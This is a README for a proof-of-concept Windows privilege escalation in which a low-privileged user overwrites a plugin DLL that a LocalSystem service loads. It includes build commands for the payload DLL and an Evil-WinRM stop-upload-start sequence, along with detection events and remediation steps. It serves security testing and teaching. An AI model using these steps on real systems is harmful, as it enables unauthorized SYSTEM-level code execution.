# Privileged Service, Writable Plugin Directory — LocalSystem DLL Plant PoC

A minimal PoC for a common Windows privilege escalation pattern: a service
running as **LocalSystem** loads a DLL from a directory that a low-privileged
user can write to. Replacing that DLL gives code execution as `SYSTEM`.

This is **not a CVE**. There is no vendor bug here, no memory corruption and no
authentication bypass. The vulnerability is the deployment: privileged process +
user-writable plugin path + no integrity check.

> **Disclaimer** — For authorized security testing, lab environments and
> defensive research only. Run this against systems you own or have explicit
> written permission to test. You are responsible for your actions.

## The pattern

A typical internal "updater" or "agent" service looks like this:

```csharp
protected override void OnStart(string[] args) {
    string p = Path.Combine(AppDomain.CurrentDomain.BaseDirectory,
                            "plugins", "version.dll");
    if (File.Exists(p)) { LoadLibrary(p); }
}
```

With an ACL of the form:

```
C:\ProgramData\CorpUpdate\plugins
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Administrators:(OI)(CI)(F)
    CORP\jdoe:(OI)(CI)(M)          <-- low-privileged user has Modify
```

`jdoe` cannot administer the service (the service SDDL grants only
`SERVICE_START`/`SERVICE_STOP`, not `SERVICE_CHANGE_CONFIG`), but `jdoe` can
overwrite the plugin. On the next service start, the DLL runs as `SYSTEM`.

Path notes:

- The service loads the plugin by **full path**, so this is a *DLL plant via
  insecure file permissions* (CWE-732), not DLL search-order hijacking.
- The service binary lives in a directory the user can only read, so replacing
  `CorpUpdate.exe` is not an option — only the `plugins` subtree is writable.
- Restarting the service is required: the loaded DLL is locked by the running
  process, so it cannot be overwritten while the service is up.

## Why this is not a CVE

| Item | Value |
|---|---|
| CVE | none — misconfiguration, not a product vulnerability |
| Class | CWE-732: Incorrect Permission Assignment for Critical Resource |
| Precondition | Local write access to a directory a SYSTEM service loads code from |
| Result | Code execution as `SYSTEM` |

If your report calls this "DLL hijacking", be precise about *which* kind. The
CVE-worthy variants (search-order hijacking, phantom DLL loading) are different
bugs with different fixes.

## Contents

| File | Purpose |
|---|---|
| `src/dll.c` | Payload DLL: reads a SYSTEM-only file, records the running identity |
| `build.sh` | Cross-compiles `version.dll` with mingw-w64 |
| `deploy.cmds` | Evil-WinRM command template (stop → upload → start → read) |

## Build

```bash
sudo apt install -y gcc-mingw-w64-x86-64
./build.sh
```

The architecture must match the target process. A 32-bit DLL loaded by a 64-bit
service fails silently inside `LoadLibrary` — the service still reports
`Running`, and nothing appears in the output file. When debugging, always check
that the DLL is the right bitness before assuming the exploit is broken.

Custom paths:

```bash
x86_64-w64-mingw32-gcc -shared -O2 -o version.dll src/dll.c \
    -DIN_FILE='"C:/Users/Administrator/Desktop/proof.txt"' \
    -DOUT_FILE='"C:/ProgramData/CorpUpdate/plugins/pwned.txt"'
```

## Deploy

From a WinRM session as the low-privileged user:

```
sc.exe stop <SERVICE_NAME>
upload version.dll <PLUGIN_DIR>/version.dll
sc.exe start <SERVICE_NAME>
type <PLUGIN_DIR>/pwned.txt
```

Expected output in `pwned.txt`: the account the service runs as on the first
line (`SYSTEM`, or the machine account for some service types), followed by the
contents of the file the payload read.

See `deploy.cmds` for a ready-to-pipe template.

## Detection

- File-write events in a service's plugin/update directory by a non-admin
  principal (Sysmon EID 11, Windows EID 4663 with object auditing).
- `sc.exe stop/start` on an agent service by a user who is not an administrator
  of that host (EID 4688 command line, EID 7040 service state change).
- New DLLs in program-data update paths that are not Authenticode-signed by the
  expected publisher.
- Service process (`CorpUpdate.exe`) loading a DLL from a user-writable path —
  Sysmon EID 7 `ImageLoad` with `Signed=false` and an unexpected path.

## Remediation

1. Remove `Modify`/`Write` for non-admin principals on plugin and update
   directories. Grant read+execute only.
2. Verify plugin integrity before loading: Authenticode signature check, or a
   hash allowlist shipped with the service.
3. Run the service with the least privilege it needs instead of `LocalSystem`.
4. Do not place updatable code under `C:\ProgramData` with broad ACLs; use
   `C:\Program Files` and MSI/servicing.
5. Alert on service state changes and DLL loads from writable directories.

## License

MIT — see [LICENSE](LICENSE).
